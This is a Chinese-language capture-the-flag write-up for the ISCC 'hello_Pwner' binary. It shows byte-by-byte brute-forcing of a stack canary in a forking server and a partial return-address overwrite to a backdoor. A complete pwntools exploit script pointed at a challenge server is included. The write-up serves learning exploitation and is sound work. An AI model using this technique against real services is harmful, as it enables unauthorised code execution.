---
title: iscc_hello_Pwner_wp
date: 2021-05-09 11:51:39
tags:

---



# iscc_hello_pwner_wp

>one-by-one 爆破Canary原理
>
>1.对于Canary，虽然每次进程重启后Canary不同，但是同一个进程中的不同线程的Cannary是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存。
>
>2.最低位为0x00，之后逐次爆破，如果canary爆破不成功，则程序崩溃；爆破成功则程序进行下面的逻辑。由此可判断爆破是否成功。



## 主函数

![](https://i.imgur.com/wkVw66U.png)

无限循环fork()子进程

进入vuln()函数：

## vuln()

![](https://i.imgur.com/M6f5TTi.png)

可以看到v1正是canary，其位置在ebp-0xc。

缓冲区在ebp-0x70的位置。



## 后门函数

![](https://i.imgur.com/NXpaIJh.png)



## 动态调试

> LD_PRELOAD=/lib/i386-linux-gnu/libc.so.6 ./hello_Pwner
>
> ps -el
>
> sudo gdb attach  pid





![](https://i.imgur.com/E5SiKcM.png)

动态调试发现backdoor的地址和read_plt的地址只有后四位不同，后三位各函数都是固定的，于是只需要爆破第四位就行。



## 爆破canary

> *anary*一般是尾随的(也有特殊情况,具体看作者的汇编情况),在32位下是4个*字节*,64位下是8个*字节*(最低位都是\x00) 

这里通过循环实现对剩余七个字节的爆破，（CANARY的最低字节为00）

```
canary = '\x00'
for k in range(3):
    for i in range(256):
        print "the " + str(k) + ": " + chr(i)
        p.send('a'*100 + canary + chr(i))
        a = p.recvuntil("Hello,Pwner!\n")
        print a

        
        if "*** stack smashing detected ***: ./hello_Pwner terminated\n" in a:
            continue
        else:
                canary += chr(i)
                print "canary: " + canary
                break
```



payload = 'A' * 100 + canary + 'A' * 12 + "\xba\x**7**7"

> 这个7可以换成0-f的任意一个

最后的exp：







```
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context(arch='i386', os='linux')
local = 1
elf = ELF('./hello_Pwner')

if local:
    p = process('./hello_Pwner')
    elf=ELF('./hello_Pwner')
    #libc = ELF("./libc.so.6")

else:
    p = remote('39.96.88.40',8010)
    libc = ELF('./hello_Pwner')
p.recvuntil('Hello,Pwner!\n')


puts_plt = elf.plt['puts']
puts_gots=elf.got['puts']
print p32(puts_plt)

canary = '\x00'
for k in range(3):
    for i in range(256):
        print "the " + str(k) + ": " + chr(i)
        p.send('a'*100 + canary + chr(i))
        a = p.recvuntil("Hello,Pwner!\n")
        print a

        
        if "*** stack smashing detected ***: <unknown> terminated\n" in a:
            continue
        else:
                canary += chr(i)
                print "canary: " + canary
                break
payload = 'A' * 100 + canary + 'A' * 12 + "\xba\x77"#read  and back zhi you  hou si ge zi jie bu yi yang
p.send(payload)
p.interactive()
```



 对远端多次运行exp，总有一次成功。

